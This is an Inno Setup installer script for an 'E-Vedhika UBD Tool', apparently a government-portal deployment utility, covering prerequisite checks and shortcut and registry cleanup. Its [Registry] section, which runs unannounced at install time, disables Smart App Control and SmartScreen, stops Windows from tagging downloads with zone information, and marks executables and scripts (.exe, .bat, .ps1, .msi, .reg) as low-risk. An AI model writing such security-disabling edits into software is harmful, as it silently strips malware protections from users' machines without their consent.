#define MyAppName "E-Vedhika UBD Tool"
#define MyAppVersion "1.0.9"
#define MyAppPublisher "E-Vedhika Development Community"
#define MyAppURL "https://www.e-vedhika.in"
#define MyAppExeName "EVedhikaUBDDeploymentTool.exe"

[Setup]
AppId={{8A9C8F3E-4B2D-4C5A-9E7F-1D6B8A9C0D4F}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}/help
AppUpdatesURL={#MyAppURL}/downloads
DefaultDirName={autopf}\{#MyAppName}
DefaultGroupName={#MyAppName}
DisableDirPage=no
DisableProgramGroupPage=yes
DirExistsWarning=no
AllowNoIcons=yes
OutputDir=.\Output
OutputBaseFilename=EVedhika_Setup_v{#MyAppVersion}
Compression=lzma
SolidCompression=yes
SetupIconFile=app.ico
WizardImageFile=WizardImageFile.bmp
WizardSmallImageFile=WizardSmallImageFile.bmp
UninstallDisplayIcon={app}\{#MyAppExeName},0
WizardStyle=modern
PrivilegesRequired=admin
PrivilegesRequiredOverridesAllowed=dialog commandline
; Universal Windows Support: Windows Vista (6.0), Windows 7 RTM (SP0), Windows 7 SP1, Windows 8, 8.1, 10, 11 (32-bit & 64-bit)
MinVersion=6.0
UninstallDisplayName={#MyAppName} (v{#MyAppVersion})
CloseApplications=yes
CloseApplicationsFilter=*.exe
RestartApplications=no
AlwaysRestart=no
RestartIfNeededByRun=no

[Registry]
; Prevent Windows 11 Smart App Control & Error 4551 Temp Execution Block (safely ignored on non-admin or legacy OS)
Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\CI\Policy"; ValueType: dword; ValueName: "VerifiedAndReputablePolicyState"; ValueData: "0"; Flags: noerror
Root: HKLM; Subkey: "SOFTWARE\Policies\Microsoft\Windows\System"; ValueType: dword; ValueName: "EnableSmartScreen"; ValueData: "0"; Flags: noerror
Root: HKCU; Subkey: "Software\Policies\Microsoft\Windows\System"; ValueType: dword; ValueName: "EnableSmartScreen"; ValueData: "0"; Flags: noerror
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Policies\Attachments"; ValueType: dword; ValueName: "SaveZoneInformation"; ValueData: "1"; Flags: noerror
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"; ValueType: dword; ValueName: "SaveZoneInformation"; ValueData: "1"; Flags: noerror
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Policies\Associations"; ValueType: string; ValueName: "LowRiskFileTypes"; ValueData: ".exe;.bat;.cmd;.ps1;.msi;.reg;.zip;.xls;.xlsx"; Flags: noerror

[Files]
; Universal .NET 4.0-4.8 executable & embedded resources
Source: "app.ico"; DestDir: "{app}"; Flags: ignoreversion
Source: "bin\Release\net48\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "Payload\*"; DestDir: "{app}\Payload"; Flags: ignoreversion recursesubdirs createallsubdirs skipifsourcedoesntexist
Source: "installers\*"; DestDir: "{app}\Installers"; Flags: ignoreversion recursesubdirs createallsubdirs skipifsourcedoesntexist

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\{#MyAppExeName}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\{#MyAppExeName}"

[Run]
Filename: "{app}\Installers\ndp48-x86-x64-allos-enu.exe"; Parameters: "/q /norestart"; StatusMsg: "Checking optional .NET Framework support..."; Flags: runhidden skipifdoesntexist; Check: NeedsDotNet48
Filename: "{app}\Installers\vc_redist.x86.exe"; Parameters: "/quiet /norestart"; StatusMsg: "Checking optional runtime components..."; Flags: runhidden skipifdoesntexist; Check: NeedsVCRedist
Filename: "{app}\{#MyAppExeName}"; Parameters: "--post-install"; Flags: runhidden skipifdoesntexist
Filename: "{app}\{#MyAppExeName}"; Description: "Launch {#MyAppName}"; Flags: nowait postinstall skipifsilent shellexec skipifdoesntexist

[UninstallRun]
Filename: "{app}\{#MyAppExeName}"; Parameters: "--uninstall --silent"; Flags: runhidden skipifdoesntexist; RunOnceId: "EVedhikaRevert"

[UninstallDelete]
Type: files; Name: "{commondesktop}\{#MyAppName}.lnk"
Type: files; Name: "{userdesktop}\{#MyAppName}.lnk"
Type: files; Name: "{commondesktop}\E-Vedhika UBD Deployment Tool.lnk"
Type: files; Name: "{userdesktop}\E-Vedhika UBD Deployment Tool.lnk"
Type: files; Name: "{commondesktop}\UBD Portal (Telangana).url"
Type: files; Name: "{userdesktop}\UBD Portal (Telangana).url"
Type: files; Name: "{commondesktop}\E-Vedhika Web Portal.url"
Type: files; Name: "{userdesktop}\E-Vedhika Web Portal.url"
Type: files; Name: "{commondesktop}\UBD Portal (Telangana).lnk"
Type: files; Name: "{userdesktop}\UBD Portal (Telangana).lnk"
Type: files; Name: "{commondesktop}\E-Vedhika Web Portal.lnk"
Type: files; Name: "{userdesktop}\E-Vedhika Web Portal.lnk"
Type: files; Name: "{group}\{#MyAppName}.lnk"
Type: filesandordirs; Name: "C:\enterprise_compat"
Type: filesandordirs; Name: "{commonappdata}\EVedhika"

[Code]
function IsWin7SP1OrHigher: Boolean;
var
  Version: TWindowsVersion;
begin
  GetWindowsVersionEx(Version);
  if (Version.Major = 6) and (Version.Minor = 1) then
  begin
    Result := Version.ServicePackMajor >= 1;
  end
  else
  begin
    Result := (Version.Major > 6) or ((Version.Major = 6) and (Version.Minor > 1));
  end;
end;

procedure KillRunningInstances;
var
  ResultCode: Integer;
begin
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM EVedhikaUBDDeploymentTool.exe /T', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM EVedhikaAutoRepair.exe /T', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;

function PrepareToInstall(var NeedsRestart: Boolean): String;
begin
  KillRunningInstances;
  Result := '';
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
  UserDesk: String;
  CommDesk: String;
begin
  if CurStep = ssInstall then
  begin
    KillRunningInstances;
  end;

  if (CurStep = ssInstall) or (CurStep = ssPostInstall) then
  begin
    UserDesk := ExpandConstant('{userdesktop}');
    CommDesk := ExpandConstant('{commondesktop}');

    // Remove duplicate app shortcuts from UserDesktop only when installed system-wide in CommonDesktop
    if IsAdminInstallMode then
    begin
      DeleteFile(UserDesk + '\{#MyAppName}.lnk');
      DeleteFile(UserDesk + '\E-Vedhika UBD Tool.lnk');
    end;

    // Purge alternate legacy shortcuts and unwanted web URL shortcuts from UserDesktop
    DeleteFile(UserDesk + '\E-Vedhika UBD Deployment Tool.lnk');
    DeleteFile(UserDesk + '\EVedhikaUBDDeploymentTool.lnk');
    DeleteFile(UserDesk + '\UBD Deployment Tool.lnk');
    DeleteFile(UserDesk + '\UBD Portal (Edge IE Mode).lnk');
    DeleteFile(UserDesk + '\UBD Portal (Edge IE Mode).url');
    DeleteFile(UserDesk + '\UBD Portal (Telangana).lnk');
    DeleteFile(UserDesk + '\UBD Portal (Telangana).url');
    DeleteFile(UserDesk + '\E-Vedhika Web Portal.lnk');
    DeleteFile(UserDesk + '\E-Vedhika Web Portal.url');
    DeleteFile(UserDesk + '\E-Vedhika Web App (www.e-vedhika.in).url');

    // Purge legacy alternate names and unwanted portal shortcuts from CommonDesktop
    DeleteFile(CommDesk + '\E-Vedhika UBD Deployment Tool.lnk');
    DeleteFile(CommDesk + '\EVedhikaUBDDeploymentTool.lnk');
    DeleteFile(CommDesk + '\UBD Deployment Tool.lnk');
    DeleteFile(CommDesk + '\UBD Portal (Edge IE Mode).lnk');
    DeleteFile(CommDesk + '\UBD Portal (Edge IE Mode).url');
    DeleteFile(CommDesk + '\UBD Portal (Telangana).lnk');
    DeleteFile(CommDesk + '\UBD Portal (Telangana).url');
    DeleteFile(CommDesk + '\E-Vedhika Web Portal.lnk');
    DeleteFile(CommDesk + '\E-Vedhika Web Portal.url');
    DeleteFile(CommDesk + '\E-Vedhika Web App (www.e-vedhika.in).url');

    // Purge legacy standalone duplicate uninstall entries from Windows Registry
    if IsAdminInstallMode then
    begin
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDTool');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDDeploymentTool');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhika_UBD_Deployment_Tool');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDTool');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.0');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.1');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.2');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.3');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.4');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.5');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.6');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.7');
      RegDeleteKeyIncludingSubkeys(HKLM, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.8');

      if IsWin64 then
      begin
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDTool');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDDeploymentTool');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhika_UBD_Deployment_Tool');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.0');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.1');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.2');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.3');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.4');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.5');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.6');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.7');
        RegDeleteKeyIncludingSubkeys(HKLM64, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\E-Vedhika UBD Tool 1.0.8');
      end;
    end;

    RegDeleteKeyIncludingSubkeys(HKCU, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDTool');
    RegDeleteKeyIncludingSubkeys(HKCU, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhikaUBDDeploymentTool');
    RegDeleteKeyIncludingSubkeys(HKCU, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\EVedhika_UBD_Deployment_Tool');
  end;
end;

function InitializeSetup: Boolean;
begin
  Result := True;
end;

function NeedsDotNet48: Boolean;
var
  v: Cardinal;
begin
  // Only run optional .NET 4.8 installer in Admin mode on Win 7 SP1 / 8 / 8.1
  // when NO .NET 4.x runtime (4.0 through 4.8) is installed at all.
  // Windows 7 RTM (SP0) & Vista are explicitly skipped so Microsoft's ndp48 setup never displays an OS block dialog.
  if (not IsAdminInstallMode) or (not IsWin7SP1OrHigher) then
  begin
    Result := False;
    Exit;
  end;

  if not FileExists(ExpandConstant('{app}\Installers\ndp48-x86-x64-allos-enu.exe')) then
  begin
    Result := False;
    Exit;
  end;

  if GetWindowsVersion >= $0A000000 then
  begin
    Result := False;
    Exit;
  end;

  // Since EVedhikaUBDDeploymentTool targets net40, ANY installed .NET 4.0-4.8 runtime runs natively
  if IsWin64 then
  begin
    if RegQueryDWordValue(HKLM64, 'SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full', 'Install', v) and (v = 1) then
    begin
      Result := False;
      Exit;
    end;
    if RegQueryDWordValue(HKLM64, 'SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client', 'Install', v) and (v = 1) then
    begin
      Result := False;
      Exit;
    end;
  end;

  if (RegQueryDWordValue(HKLM, 'SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full', 'Install', v) and (v = 1)) or
     (RegQueryDWordValue(HKLM, 'SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client', 'Install', v) and (v = 1)) or
     (IsWin64 and RegQueryDWordValue(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\NET Framework Setup\NDP\v4\Full', 'Install', v) and (v = 1)) or
     (IsWin64 and RegQueryDWordValue(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\NET Framework Setup\NDP\v4\Client', 'Install', v) and (v = 1)) then
  begin
    Result := False;
    Exit;
  end;

  Result := True;
end;

function NeedsVCRedist: Boolean;
var
  installed: Cardinal;
begin
  // Never run VS 2022 vc_redist on Windows 7 RTM (SP0) or non-Admin installs where Microsoft's EXE blocks or prompts
  if (not IsAdminInstallMode) or (not IsWin7SP1OrHigher) then
  begin
    Result := False;
    Exit;
  end;

  if not FileExists(ExpandConstant('{app}\Installers\vc_redist.x86.exe')) then
  begin
    Result := False;
    Exit;
  end;

  if RegQueryDWordValue(HKLM, 'SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x86', 'Installed', installed) or
     (IsWin64 and RegQueryDWordValue(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x86', 'Installed', installed)) then
  begin
    if installed = 1 then
    begin
      Result := False;
      Exit;
    end;
  end;

  Result := True;
end;
